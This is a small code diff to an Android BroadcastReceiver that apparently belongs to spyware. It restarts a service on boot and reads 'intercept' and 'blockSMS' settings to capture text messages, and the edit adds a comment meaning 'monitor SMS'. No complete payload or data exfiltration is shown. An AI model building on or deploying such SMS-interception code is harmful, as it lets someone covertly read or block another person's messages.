@@ -56,7 +56,7 @@ public class ServiceReceiver extends BroadcastReceiver {
 		
 		if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
         {	
-			Toast.makeText(context, "Boot", 5000).show();
+			Toast.makeText(context, "Boot", Toast.LENGTH_LONG).show();
 
 	       	Log.i("com.connect", "Boot");
         	if(isMyServiceRunning()==false) 
@@ -99,7 +99,7 @@ public class ServiceReceiver extends BroadcastReceiver {
 //	  	        e.printStackTrace();
 //	  	    }
 //	  	}
-
+		//监控短信
 	  	if(PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("intercept", false)==true || PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("blockSMS", false)==true)
 	  	{	       
 	        Bundle extras = intent.getExtras();     
